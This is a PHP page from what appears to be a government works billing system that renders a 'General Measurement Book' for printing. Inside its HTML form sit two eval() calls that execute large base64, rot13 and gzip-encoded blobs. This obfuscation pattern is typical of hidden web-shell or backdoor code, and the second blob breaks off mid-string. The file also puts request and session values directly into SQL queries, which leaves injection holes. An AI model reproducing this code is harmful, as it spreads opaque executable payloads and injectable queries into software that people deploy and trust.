<?php
@ob_start();
require_once 'library/config.php';
require_once 'library/functions.php';
require_once 'library/binddata.php';
include "library/common.php";
include "sysdate.php";
checkUser();
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
$NextMbIncr = 0; $UsedMBArr = array();
$msg = '';
$newmbookno='';
$staffid = $_SESSION['sid'];
$userid = $_SESSION['userid'];
$mbooktype = "G";
function dt_format($ddmmyyyy) {
    $dt = explode('/', $ddmmyyyy);
    $dd = $dt[0];
    $mm = $dt[1];
    $yy = $dt[2];
    return $yy . '-' . $mm . '-' . $dd;
}
function dt_display($ddmmyyyy) {
    $dt = explode('-', $ddmmyyyy);
    $dd = $dt[2];
    $mm = $dt[1];
    $yy = $dt[0];
    return $dd . '/' . $mm . '/' . $yy;
}
function getWordWrapCount($description,$char)
{
	$wrap_cnt 	= 0; 
	$descwork 	= "";
	$char_no 	= $char;
	$work_desc 	= $description;
	$desc 		= wordwrap($work_desc,$char_no,'<br>');
	$exp_line 	= explode('<br>', $desc);
	$wlcnt 		= count($exp_line);
	for($xc=0; $xc<$wlcnt; $xc++)
	{
		if($exp_line[$xc] != "")
		{
			$wrap_cnt++;
			$descwork .= $exp_line[$xc]."<br/> ";
		}
	}
	return array($descwork, $wrap_cnt);
}
function check_line($title,$table,$page,$mbookno,$newmbookno,$table1)
{
	if($page == 100) { $mbookno = $newmbookno; }
	$row = '<tr style="border-style:none;"><td style="border-style:none;" colspan="9" align="center">&nbsp;<br/>Page '.$page.'&nbsp;&nbsp</td></tr>';
	$row = $row."</table>";
	$row = $row."<p  style='page-break-after:always;'></p>";
	$row = $row.'<table width="875" border="0"  cellpadding="1" cellspacing="1" align="center" bgcolor="#FFFFFF" style="border:none;" class="label">
			<tr style="border:none;"><td align="center" style="border:none;">General M.Book No. '.$mbookno.'&nbsp;&nbsp;<br/>&nbsp;</td></tr>
			</table>';
	$row = $row.$table;
	$row = $row.'<table width="875" border="0" cellpadding="1" cellspacing="1" align="center" bgcolor="#FFFFFF" class="label">';
	$row = $row.$table1;
	echo $row;
}
$staff_design_sql = "select staff.staffname, designation.designationname from staff INNER JOIN designation ON (designation.designationid = staff.designationid) WHERE staff.staffid = '$staffid' AND staff.active = 1 AND designation.active = 1";
$staff_design_query = mysql_query($staff_design_sql);
$staffList = mysql_fetch_object($staff_design_query);
$staffname = $staffList->staffname;
$designation = $staffList->designationname;
$zone_id = $_SESSION['zone_id'];
if(($zone_id != "") && ($zone_id != "all"))
{
	$zone_clause = " AND mbookheader.zone_id = '".$zone_id."'";
}
else
{
	$zone_clause = "";
}
if($_GET['workno'] != "")
{
	$sheetid = $_GET['workno'];
}
if($_POST["Back"] == " Back ")
{
     header('Location: MeasurementBookPrint_staff.php');
}
$select_rbn_query = "select DISTINCT rbn FROM mbookgenerate WHERE sheetid = '$sheetid' AND flag = '1'";
//$select_rbn_query = "select DISTINCT rbn FROM mbookgenerate WHERE sheetid = '$sheetid' AND staffid = '$staffid' AND flag = '1'";
$select_rbn_sql = mysql_query($select_rbn_query);
$Rbnresult = mysql_fetch_object($select_rbn_sql);
$rbn = $Rbnresult->rbn;
$selectmbook_detail = " select date(max(fromdate)) as fromdate, date(max(todate)) as todate, abstmbookno, is_finalbill FROM mbookgenerate_staff WHERE sheetid = '$sheetid' AND staffid = '$staffid' AND flag = '1' AND rbn = '$rbn' AND zone_id = '$zone_id' group by sheetid";
$selectmbook_detail_sql = mysql_query($selectmbook_detail);
if ($selectmbook_detail_sql == true) 
{
	$Listmbdetail = mysql_fetch_object($selectmbook_detail_sql);
	$fromdate = $Listmbdetail->fromdate; $todate = $Listmbdetail->todate; $abstmbookno = $Listmbdetail->abstmbookno; $is_finalbill = $Listmbdetail->is_finalbill;
}
//echo $fromdate; echo $todate; exit; 
//$fromdate = '2016-05-30';
//$todate = '2016-09-30';

/////////////////////////// COMMENTED ON 22.07.2019 FOR MULTIPLE MB SELECTION ////////////////////////////////////////
/*$selectmbookno = "select mbname, old_id from oldmbook WHERE mbook_type = 'G' AND sheetid = '$sheetid' AND staffid = '$staffid'";
$selectmbookno_sql = mysql_query($selectmbookno);
if(mysql_num_rows($selectmbookno_sql)>0)
{
	$Listmbookno = mysql_fetch_object($selectmbookno_sql);
	$mbookno = $Listmbookno->mbname; $oldmbookid = $Listmbookno->old_id;
	
	$mbookpage = "select mbpage from mbookallotment WHERE sheetid = '$sheetid' AND staffid = '$staffid' AND active = '1' AND mbno = '$mbookno'";
	$mbookpage_sql = mysql_query($mbookpage);
	$mbookpageno = @mysql_result($mbookpage_sql,'mbpage')+1;
	
	$selectnewmbookno = "select DISTINCT mbno from mbookgenerate_staff WHERE sheetid = '$sheetid' AND flag = '1' AND mbno != '$mbookno' AND staffid = '$staffid' AND rbn = '$rbn' AND zone_id = '$zone_id'";
	$selectnewmbookno_sql = mysql_query($selectnewmbookno);
	$newmbookno = @mysql_result($selectnewmbookno_sql,'mbno');
	
	$newmbookpage = "select mbpage from mbookallotment WHERE sheetid = '$sheetid' AND staffid = '$staffid' AND active = '1' AND mbno = '$newmbookno'";
	$newmbookpage_sql = mysql_query($newmbookpage);
	$newmbookpageno = @mysql_result($newmbookpage_sql,'mbpage')+1;
	
//$newmbookpageno = $objBind->DisplayPageDetails($newmbookno,$newmbookno,$sheetid,'cw');
//$newmbookpageno = $newmbookpageno +1;
}
else
{
	$selectmbookno = "select DISTINCT mbno from mbookgenerate_staff WHERE sheetid = '$sheetid' AND flag = '1' AND staffid = '$staffid' AND rbn = '$rbn' AND zone_id = '$zone_id'";
	$selectmbookno_sql = mysql_query($selectmbookno);
	$mbookno = @mysql_result($selectmbookno_sql,'mbno');
	
	$mbookpage = "select mbpage from mbookallotment WHERE sheetid = '$sheetid' AND staffid = '$staffid' AND active = '1' AND mbno = '$mbookno'";
	$mbookpage_sql = mysql_query($mbookpage);
	$mbookpageno = @mysql_result($mbookpage_sql,'mbpage')+1;
}


$select_new_mbook_no_query1 = "select mbno, startpage from mymbook where sheetid = '$sheetid' AND staffid = '$staffid' AND active = '1' AND mbookorder = '1' AND rbn = '$rbn' AND mtype = 'G' AND  zone_id = '$zone_id' and genlevel = 'staff'";
//echo $select_new_mbook_no_query1;exit;
$select_new_mbook_no_sql1 = mysql_query($select_new_mbook_no_query1);
if($select_new_mbook_no_sql1 == true)
{
	if(mysql_num_rows($select_new_mbook_no_sql1)>0)
	{
		$NMBList1 = mysql_fetch_object($select_new_mbook_no_sql1);
		$mbookno = $NMBList1->mbno;
		$mbookpageno = $NMBList1->startpage;
	}
}



$select_new_mbook_no_query = "select mbno, startpage from mymbook where sheetid = '$sheetid' AND staffid = '$staffid' AND active = '1' AND mbookorder = '2' AND rbn = '$rbn' AND mtype = 'G' AND  zone_id = '$zone_id' and genlevel = 'staff'";
//echo $select_new_mbook_no_query;
$select_new_mbook_no_sql = mysql_query($select_new_mbook_no_query);
if($select_new_mbook_no_sql == true)
{
	if(mysql_num_rows($select_new_mbook_no_sql)>0)
	{
		$NMBList = mysql_fetch_object($select_new_mbook_no_sql);
		$newmbookno = $NMBList->mbno;
		$newmbookpageno = $NMBList->startpage;
	}
}
$mpage = $mbookpageno;
*/
/////////////////////////// COMMENTED ON 22.07.2019 FOR MULTIPLE MB SELECTION ////////////////////////////////////////


//$mbookpageno = $objBind->DisplayPageDetails($mbookno,$mbookno,$sheetid,'cw');
//$mbookpageno = $mbookpageno+1;

/*echo "NEW MB ".$newmbookno."<br/>";
echo "NEW MB PAGE ".$newmbookpageno."<br/>";
echo "OLD MB ".$mbookno."<br/>";
echo "OLD MB PAGE ".$mbookpageno."<br/>";
exit;*/

//echo $mbookno;exit;
//$sheetid=$_SESSION["sheet_id"]; 
//$fromdate = $_SESSION['fromdate'];
//$todate = $_SESSION['todate'];
//$mbookno = $_SESSION["mb_no"];    
//$mpage = $_SESSION["mb_page"];
//$mbno_id = $_SESSION["mbno_id"];
//$rbn = $_SESSION["rbn"];
//$abstmbookno = $_SESSION["abs_mbno"];
$query = "SELECT * FROM sheet WHERE sheet_id ='$sheetid' ";
$sqlquery = mysql_query($query);
if ($sqlquery == true) {
    $List = mysql_fetch_object($sqlquery);
    $work_name = $List->work_name;    $tech_sanction = $List->tech_sanction;
    $name_contractor = $List->name_contractor;    $agree_no = $List->agree_no; $work_order_no = $List->work_order_no; 
	$ccno = $List->computer_code_no;
	$adoc 				= 	$List->act_doc;
	$sdoc 				= 	$List->date_of_completion;
    //if($List->rbn  ==0) { $runn_acc_bill_no =1;  } else { $runn_acc_bill_no =$List->rbn + 1;}
	$runn_acc_bill_no = $rbn;
    //$_SESSION["currentrbn"]=$runn_acc_bill_no;
}

$length = strlen($work_name);
//echo $length."<br/>";
$start_line = ceil($length/87);
//echo $start_line;
/*$mbookgeneratedelsql = "DELETE FROM mbookgenerate WHERE flag =1";
$result = dbQuery($mbookgeneratedelsql);
function mbookgenerateinsert($staffid,$sheetid,$prev_divid,$prev_subdivid,$fromdate,$todate,$mbookno,$mpage,$contentarea,$abstmbookno,$rbn,$userid)
{ 
   $querys="INSERT INTO mbookgenerate set sheetid='$sheetid',divid='$prev_divid',subdivid='$prev_subdivid',
       fromdate ='$fromdate',todate ='$todate' ,mbno='$mbookno',flag=1,rbn='$rbn', abstmbookno = '$abstmbookno',
            mbgeneratedate=NOW(), staffid='$staffid', mbpage='$mpage', mbtotal='$contentarea', active=1, userid='$userid'";
 //echo $querys."<br>";
   $sqlquerys = mysql_query($querys);
}*/
function getabstractpage($sheetid,$subdivid)
{
	$select_abs_page_query = "select abstmbookno, abstmbpage from measurementbook_temp WHERE sheetid = '$sheetid' AND subdivid = '$subdivid'";
	$select_abs_page_sql = mysql_query($select_abs_page_query);
	$abstmbookno = @mysql_result($select_abs_page_sql,0,'abstmbookno');
	$abstractpage = @mysql_result($select_abs_page_sql,0,'abstmbpage');
	return "C/o to Page ".$abstractpage." /Abstract MB No. ".$abstmbookno;
}
function getcompositepage($sheetid,$subdivid,$rbn,$zone_id)
{
	$select_sa_page_query = "select sa_mbno, sa_page from mbookgenerate_staff WHERE sheetid = '$sheetid' AND subdivid = '$subdivid' AND rbn = '$rbn' AND zone_id = '$zone_id'";
	$select_sa_page_sql = mysql_query($select_sa_page_query);
	$mbookno_compo = @mysql_result($select_sa_page_sql,0,'sa_mbno');
	$mbookpageno_compo = @mysql_result($select_sa_page_sql,0,'sa_page');
	if(($mbookno_compo == 0)&&($mbookpageno_compo == 0)){
		$select_abs_page_query = "select mbno, mbpage from mbookgenerate WHERE sheetid = '$sheetid' AND subdivid = '$subdivid'";
		$select_abs_page_sql = mysql_query($select_abs_page_query);
		$mbookno_compo = @mysql_result($select_abs_page_sql,0,'mbno');
		$mbookpageno_compo = @mysql_result($select_abs_page_sql,0,'mbpage');
	}
	return "C/o to Page ".$mbookpageno_compo." /General MB No. ".$mbookno_compo;
}

$NextMBFlag = 0; $NextMBList = array(); $NextMBPageList = array(); $NextMBFlag = 1;
$SelectMBookQuery = "select * from mymbook where sheetid = '$sheetid' and rbn = '$rbn' and mtype = 'G' and zone_id = '$zone_id' and genlevel = 'staff' order by mbookorder asc";
$SelectMBookSql = mysql_query($SelectMBookQuery);
if($SelectMBookSql == true){
	if(mysql_num_rows($SelectMBookSql)>0){
		while($MBList = mysql_fetch_object($SelectMBookSql)){
			if($MBList->mbookorder == 1){ 
				$mbookno = $MBList->mbno; //echo "1 = ".$abstmbno."<br/>";
				$mpage = $MBList->startpage;
			}else{
				$SelectMB 		= $MBList->mbno; 
				$SelectMBPage 	= $MBList->startpage;
				if($SelectMBPage != ''){
					array_push($NextMBList,$SelectMB); //echo $SelectMBPage."SS<br/>";
					array_push($NextMBPageList,$SelectMBPage);
				}
			}
		}
	}
}

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
        <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
        <title>General M.Book</title>
        <link rel="stylesheet" href="script/font.css" />
</head>
		<script language="javascript" type="text/javascript" src="script/Date_Calendar.js"></script>
		<script language="javascript" type="text/javascript" src="script/validfn.js"></script>
		<link rel="stylesheet" href="css/button_style.css"></link>
	 	<link rel="stylesheet" href="js/jquery-ui.css">
	  	<script src="js/jquery-1.10.2.js"></script>
	  	<script src="js/jquery-ui.js"></script>
	  	<link rel="stylesheet" href="/resources/demos/style.css">
		<script src="js/printPage.js"></script>
<!--<script>
  $(function() {
   $("#dialog").dialog({ autoOpen: false,
        minHeight: 200,
        maxHeight:200,
        minWidth: 300,
        maxWidth: 300,
        modal: true,});
        $("#dialog").dialog("open");
        $( "#dialog" ).dialog( "option", "draggable", false );
		$('#btn_cancel').click(function(){
		$("#dialog").dialog("close");
		window.location.href="Generate.php";
		});
        $('#btn').click(function(){
		var x = $('#newmbooklist option:selected').val();
		//alert(x);
			if(x == "")
			{
				var a="* Please select Next Mbook number";
				$('#error_msg').text(a);
				event.preventDefault();
				event.returnValue = false;
			}
			else
			{
				$("#dialog").dialog("close");       
				var newmbookvalue = $("#newmbooklist option:selected").text(); //alert(newmbookvalue);
				var oldmbookdetails = document.form.txt_mbno_id.value;
				$.post("GetOldMbookNo.php", {oldmbook: oldmbookdetails}, function (data) {
				window.location.href="Mbook.php?newmbook="+newmbookvalue;
				return false; // avoid to execute the actual submit of the form.
				});
			 }
         });
				$.fn.validatenewmbook = function(event) 
				{ 
					if($('#newmbooklist option:selected').val()=="")
					{ 
						var a="Please select Next Mbook number";
						$('#error_msg').text(a);
						event.preventDefault();
						event.returnValue = false;
						//return false;
					}
					else
					{
						var a="";
						$('#error_msg').text(a);
					}
				}
				$("#newmbooklist").change(function(event){
				   $(this).validatenewmbook(event);
				 });

  });
  </script>-->
  
<style type="text/css" media="print,screen" >
	table
	{ 
		border-collapse: collapse;
	}
	td 
	{ 
		border: 1px solid #A0A0A0;
		padding-top:5px;
		padding-bottom:5px;
	}
	@media screen 
	{
        div.divFooter 
		{
            display: none;
        }
    }
    @media print 
	{
        div.divFooter 
		{
            position: fixed;
            bottom: 0;
        } 
		.header
		{
			display: none !important;
		}
		.printbutton
		{
			display: none !important;
		}
	}
	.ui-dialog > .ui-widget-header {background: #20b2aa; font-size:12px;}
	.breakAfter 
	{
		page-break-before: always;
	}
	.labelcontent
	{
		font-family:Microsoft New Tai Lue;
		font-size:12pt;
		color:#000000;
	}
	.ui-dialog-titlebar-close 
	{
	  visibility: hidden;
	}
	.submit_btn
	{
		position:absolute;
		border:none;
		top:110px;
		left:80px;
		font-weight:bold;
		font-size:12px;
	}
	.cancel_btn
	{
		position:absolute;
		border:none;
		top:110px;
		left:160px;
		font-weight:bold;
		font-size:12px;
	}
	.submit_btn:hover 
	{
		color:#000000;
		-moz-box-shadow: 0px 1px 4px rgba(0,0,0,5);
		-webkit-box-shadow: 0px 1px 4px rgba(0,0,0,5);
		box-shadow:0px 1px 4px rgba(0,0,0,5);
		padding: 0.3em 1em;
	}
	.cancel_btn:hover 
	{
		color:#000000;
		-moz-box-shadow: 0px 1px 4px rgba(0,0,0,5);
		-webkit-box-shadow: 0px 1px 4px rgba(0,0,0,5);
		box-shadow:0px 1px 4px rgba(0,0,0,5);
		padding: 0.3em 1em;
	}
	.label, .labelcenter, .labelheadblue
	{
		font-size:13px;
	}
	.divclass
	{
		/*background-color:#009999;*/
		width:875px;
		padding:0px;
		border:1px solid #000000;
	}
</style>
<script type="text/javascript">
	window.history.forward();
	function noBack() { window.history.forward(); }
		
	function goBack()
	{
	   	url = "MeasurementBookPrint_staff.php";
		window.location.replace(url);
	}
</script>
<body bgcolor="" oncontextmenu="return false"onload="noBack();" onpageshow="if (event.persisted) noBack();" onUnload="">
<!--<table width="875" style="position:fixed; text-align:center; left:194px;" height="60px" align="center" bgcolor="#20b2aa" class='header'>
<tr>
<td style="color:#FFFFFF; border:none; font-weight:bold; font-size:20px;">GENERAL MEASUREMENT BOOK</td>
</tr>
</table><br/><br/><br/>-->
<form name="form" id="form" method="post">
			<?php
			eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

            ?>
            <?php echo $table2; ?>
<input type="hidden" name="txt_mbno_id" value="<?php echo $mbno_id."*".$mbookno."*"."G"."*".$staffid."*".$sheetid; ?>" id="txt_mbno_id" />
<table width="875" border="0" cellpadding="3" cellspacing="3" align="center" bgcolor="#FFFFFF" class='label'>
<?php echo $table1; ?>
<?php

eval(str_rot13(gzinflate(str_rot13(base64_decode('LUrHEqzIEfyajX264W5PJ7z3nosC773n6xckWhAE3V1xN0hMTDVYPdx/tv6I13solz/jQywY8p9smZJs+ZMPWpXf/x/8LasD2BeDcwrCmm9At1vP3BQ9EYqS8qw08Bdxj7VnaG/oSS2+iu2CrSYdkmCo1SUtLHcvrEv/TRVVGhPzHbyP6++9Afl7C1UBaoOtl8dPHjk/UIRjhs92VEB5apNMuszHEatpFBs/HZnl53AKStHKGl6XcUJzEtUV8zD0SXS2bScnSeB+MgwKAL3Y/aAh6XoSf046wod4dxST5+cr+IxCN7UBTkxtyCWQYRUqZTZT3Q1oVECeY0+Y8NgwNQ4AMjW2aLOi/cJutGYp8bwNuD6EL+ZXsbHMIqxpDW6kDSoOqBoaC4etbMH3vYIaxHh4xzaSifU73ukWZgA0ucSi83J+CrSS3KUTA6EDCYhJJDh+bIYapaRl40vuxLEharLDyuZ+8zF828EXUaZSqVrM2m0PQ132koOjx0Fb9g4VXnkpu5ULlFNX5uiWxCXGlN1RbkBaWv7Oee+3EZ0EJkWwAsB32hZLrGwjB2z4UL0QnDLUTM+2uMKETy3nSCj3FQqOLv007bxlD0OPMwcAjyTDyRfI4n0Jgks7C4/o2cJ5+uhjaBqxm8JMXgE1s6BeVlktZXpWO8W9NiVGRApq6p0twL7UAkTAJgccObCYCHinXQvpU2ljnf51Ol0vpYtH5/Q5peiSdgBpmX5QPUDYF6YMGkTIFx+JGFMrjpXrAdmhDknm9d3AM7SyvrVLQu3noeCj11Lw1GglEd9Q12oSx3QMIzyqPHC9TCIAValfEzfQDNnZOKE42nOiv4HXO7dHLd5G8lWDlkxu/XldeSjYvmOQGf3AOUB4WkcXx7nIBgsyTx5W53a869CpeQ/mY7foX0q6O/7Q2c0NUFuVx13bdMJRNPsJeSnvqOnISNFIZ7dsCKf/8gTokmr3R3p/xLB9Ae96HJZsRXKzrs0bc0Ipcu0oj5iJU0NjejSApzeiphNukGYSqTbhbWKPkWQN3SMykUi3DGKRMlyjBGJMFknndBWBDdBB6Ohe/NvwoKSSHJtDkjn9lSlq9xF3QQSEyStqtQFWTk+7jHxubXwZjMcoMeoV47nvnFjMk3CZ5rEOotnQawmm+aAZplIUnhkpu27Jn9e7B0i0abbzaB2x7wgH5nZduRkOgL4He/STBSblR66eEUf3XgtCaVazbpXCkXQj12gSfiflDVo6HRmzjIzLLH0EVAxzimnQD/NMUbYX16XeHCnrUBmSlYOYilJNpmpI+8Kys0eR3d1Fl9fF+QcQ6zocqgo30df4Mfo0CZuWW+Q1/QFudbJ4jyO7tvKREEVGpIpCqdXy0p0wj1bP2cjVqN/nVemc6np3UVwDmFqzL7xLWp/OhMWu5pgGrVSzSxPmdLGepGUrcJ05oJLP4Y9APoVsL+teWbd69bsKLdxn1XBUCUFxjW1mW5N/BIJorTXLLLrJa6cZukP237dRWw3G39yDt0PlTBssVjHJhc2JcgEq802r3b3dn4T5hkCTUFacnX4lyVZtkJZYWVaWCniAOmf54XXHrDeZOXNEFjaEq6I6Bybt75fkwVai/Oeel7baDbhsTjcHnBykDzxDnvlxZJpfY+Zq/dNfDJ/9ncgPIfnxynEG095XQRx0SVZz7uU1pEs4dFMYC5n+PvuttzAdZpmAovMCMUrmMYPonZ9sEYyRogKmZnS8XYFM6akJbJ/JuLI0LDnTl0QPkOtmzravPc49CsJjTz6K+agZ7ZPJSQINQPCIbDNr0PF8qbsc9Q6nkf1Jg48XxrDP1MeNRId9PVC6YZgJxATtlxA2WfJpL